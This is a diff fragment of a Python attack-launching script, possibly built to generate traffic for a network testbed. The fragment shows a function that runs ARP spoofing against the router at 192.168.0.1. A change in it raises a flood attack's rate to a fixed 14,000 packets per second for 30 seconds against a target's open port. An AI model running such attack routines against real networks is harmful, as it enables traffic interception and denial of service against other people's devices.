@@ -68,8 +68,10 @@ def launch_attack(selection, target_ip, intensity=None):
         runtime = random.randrange(10, 61)
         arp_spoofing(target_ip, '192.168.0.1', runtime=runtime)  # cheat MAC addr of Wi-Fi router
     elif selection == 5:  ##### need to add open ports first
-        pps = random.randrange(100, 501)    # 초당 전송할 패킷 개수
-        time = random.randrange(5, 31)      # 공격 유지 시간
+        # pps = random.randrange(100, 501)    # 초당 전송할 패킷 개수
+        # time = random.randrange(5, 31)      # 공격 유지 시간
+        pps=14000
+        time=30
         count = pps * time                  # 총 공격 패킷 수
         if target_ip in open_ports.keys():
             port = random.choice(open_ports[target_ip])  # 기기별 열린 포트 중 하나 선택
